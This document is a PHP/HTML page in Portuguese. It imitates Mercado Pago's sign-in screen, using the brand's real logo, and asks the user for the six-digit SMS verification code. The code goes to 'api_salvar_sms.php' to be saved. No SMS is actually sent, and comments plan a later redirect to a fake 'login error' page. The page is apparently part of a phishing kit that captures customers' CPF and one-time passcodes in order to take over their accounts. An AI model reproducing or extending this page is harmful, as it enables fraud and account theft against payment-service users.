<?php
session_start();

// --- LÓGICA DE DADOS DINÂMICOS ---
// Recupera os dados salvos na sessão da página anterior.
$identificador_cliente = $_SESSION['identificador_usuario'] ?? '288.114.198-67'; // Valor de exemplo caso a sessão não exista
$tipo_identificador = $_SESSION['tipo_identificador'] ?? 'CPF'; // Valor de exemplo

// Função para formatar o CPF (se aplicável)
function formatarCPF($cpf) {
    $cpfLimpio = preg_replace('/[^0-9]/', '', $cpf);
    if (strlen($cpfLimpio) != 11) {
        return $cpf; // Se não for um CPF, retorna o valor original
    }
    return substr($cpfLimpio, 0, 3) . '.' . substr($cpfLimpio, 3, 3) . '.' . substr($cpfLimpio, 6, 3) . '-' . substr($cpfLimpio, 9, 2);
}

// Formata o dado apenas se o tipo for 'CPF'
$dado_formatado = ($tipo_identificador === 'CPF') ? formatarCPF($identificador_cliente) : $identificador_cliente;
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Insira o código SMS</title>
    <style>
        :root {
            --cor-amarela: #ffe600;
            --cor-azul: #3483fa;
            --cor-texto-primaria: #333;
            --cor-texto-secundaria: #666;
            --cor-fundo: #f5f5f5;
            --cor-card: #ffffff;
            --cor-borda: #ddd;
        }
        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--cor-fundo); color: #333; }
        .main-header { background-color: var(--cor-amarela); height: 60px; display: flex; align-items: center; padding: 0 48px; }
        .main-header img { height: 37px; }
        .main-content { padding-top: 80px; flex-grow: 1; }
        .content-wrapper { max-width: 960px; margin: 0 auto; display: flex; justify-content: center; align-items: flex-start; gap: 64px; }
        .left-column { width: 340px; flex-shrink: 0; text-align: left; }
        .session-start-label { font-size: 12px; font-weight: 600; color: var(--cor-texto-secundaria); text-transform: uppercase; }
        .main-title { font-size: 28px; font-weight: 400; margin: 8px 0 16px 0; }
        .description-text { font-size: 16px; color: var(--cor-texto-secundaria); line-height: 1.5; margin-bottom: 24px; }
        
        .user-info-box { display: inline-flex; align-items: center; gap: 12px; border: 1px solid #e0e0e0; border-radius: 30px; padding: 8px 16px; }
        .user-info-box .icon { width: 32px; height: 32px; background-color: #eaf3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
        .user-info-box .details span { display: block; font-size: 14px; }
        .user-info-box .details a { font-size: 12px; color: var(--cor-azul); text-decoration: none; }
        
        .help-link { color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; display: inline-block; margin-top: 16px; }
        
        .form-card {
            background-color: var(--cor-card);
            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
            border-radius: 6px;
            padding: 32px 40px;
            width: 440px;
            box-sizing: border-box;
        }
        .form-card label { font-size: 16px; color: var(--cor-texto-primaria); }
        .code-inputs { display: flex; gap: 8px; justify-content: center; margin: 16px 0; }
        .code-inputs input { width: 40px; height: 50px; text-align: center; font-size: 22px; border: 1px solid var(--cor-borda); border-radius: 6px; }
        .code-inputs input:focus { border-color: var(--cor-azul); outline: none; }
        .resend-timer { text-align: left; font-size: 14px; color: var(--cor-texto-secundaria); margin: 16px 0 24px 0; min-height: 21px; }
        .resend-timer a { color: var(--cor-azul); text-decoration: none; font-weight: 500; }
        .actions { display: flex; gap: 24px; align-items: center; }
        .btn { padding: 14px 24px; font-size: 15px; font-weight: 600; border-radius: 6px; cursor: pointer; border: 1px solid transparent; }
        .btn-primary { background-color: var(--cor-azul); color: white; flex-grow: 1; }
        .btn-secondary { color: var(--cor-azul); text-decoration: none; white-space: nowrap; }
    </style>
</head>
<body>

    <header class="main-header">
        <img src="https://http2.mlstatic.com/storage/mobile-on-demand-resources/image/web-private-nav-mp-logo_1X?updatedAt=1746639317789" alt="Mercado Pago">
    </header>

    <main class="main-content">
        <div class="content-wrapper">
            
            <div class="left-column">
                <span class="session-start-label">INÍCIO DE SESSÃO</span>
                <h1 class="main-title">Insira o código que te enviamos por SMS</h1>
                <p class="description-text">É um código de 6 dígitos enviado ao telefone terminado em ****.</p>

                <div class="user-info-box">
                    <div class="icon">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 21V19C20 16.7909 18.2091 15 16 15H8C5.79086 15 4 16.7909 4 19V21" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 11C14.2091 11 16 9.20914 16 7C16 4.79086 14.2091 3 12 3C9.79086 3 8 4.79086 8 7C8 9.20914 9.79086 11 12 11Z" stroke="#3483fa" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                    </div>
                    <div class="details">
                        <span><?php echo htmlspecialchars($tipo_identificador) . ': ' . htmlspecialchars($dado_formatado); ?></span>
                        <a href="index.php">Trocar conta</a>
                    </div>
                </div>
                <a href="#" class="help-link">Preciso de ajuda</a>
            </div>

            <div class="form-card">
                <form id="sms-form" onsubmit="handleFormSubmit(event)">
                    <label>Digite o código</label>
                    <div class="code-inputs">
                        <input type="tel" maxlength="1" pattern="[0-9]" required>
                        <input type="tel" maxlength="1" pattern="[0-9]" required>
                        <input type="tel" maxlength="1" pattern="[0-9]" required>
                        <input type="tel" maxlength="1" pattern="[0-9]" required>
                        <input type="tel" maxlength="1" pattern="[0-9]" required>
                        <input type="tel" maxlength="1" pattern="[0-9]" required>
                    </div>
                    <div class="resend-timer"></div>
                    <div class="actions">
                        <button type="submit" class="btn btn-primary">Confirmar código</button>
                        <a href="senha.php" class="btn-secondary">Escolher outro método</a>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <script>
        const smsForm = document.getElementById('sms-form');
        const inputs = [...smsForm.querySelectorAll('.code-inputs input')];
        const timerElement = document.querySelector('.resend-timer');
        let countdownInterval;

        // Lógica para pular campos e apagar
        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value && index < inputs.length - 1) { inputs[index + 1].focus(); }
            });
            input.addEventListener('keydown', (e) => {
                 if (e.key === "Backspace" && !input.value && index > 0) { inputs[index - 1].focus(); }
            });
        });

        // Lógica do Timer e Reenvio
        function startTimer() {
            let seconds = 50;
            timerElement.style.color = 'var(--cor-texto-secundaria)';
            
            function updateTimer() {
                const minutes = String(Math.floor(seconds / 60)).padStart(2, '0');
                const secs = String(seconds % 60).padStart(2, '0');
                timerElement.innerHTML = `Reenviar código em ${minutes}:${secs}`;
                
                if (seconds > 0) {
                    seconds--;
                } else {
                    clearInterval(countdownInterval);
                    timerElement.innerHTML = `<a href="#" onclick="resendSms(event)">Reenviar SMS</a>`;
                }
            }
            clearInterval(countdownInterval);
            updateTimer();
            countdownInterval = setInterval(updateTimer, 1000);
        }

        function resendSms(event) {
            event.preventDefault();
            alert('Um novo código seria enviado!');
            startTimer();
        }

        // Inicia o timer quando a página carrega
        document.addEventListener('DOMContentLoaded', startTimer);
        
        // Lógica de submissão do formulário
        async function handleFormSubmit(event) {
            event.preventDefault();
            const code = inputs.map(input => input.value).join('');

            if (code.length === 6) {
                try {
                    const response = await fetch('api_salvar_sms.php', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ sms_code: code })
                    });
                    const result = await response.json();
                    
                    if (result.success) {
                        alert('Código recebido com sucesso!');
                        // Futuramente, redirecionar para uma página de "finalizado" ou de "erro de login"
                    } else {
                        alert('Erro: ' + (result.error || 'Não foi possível salvar o código.'));
                    }
                } catch (error) {
                    alert('Erro de conexão com o servidor.');
                }
            } else {
                alert('Por favor, preencha todos os 6 dígitos.');
            }
        }
    </script>
</body>
</html>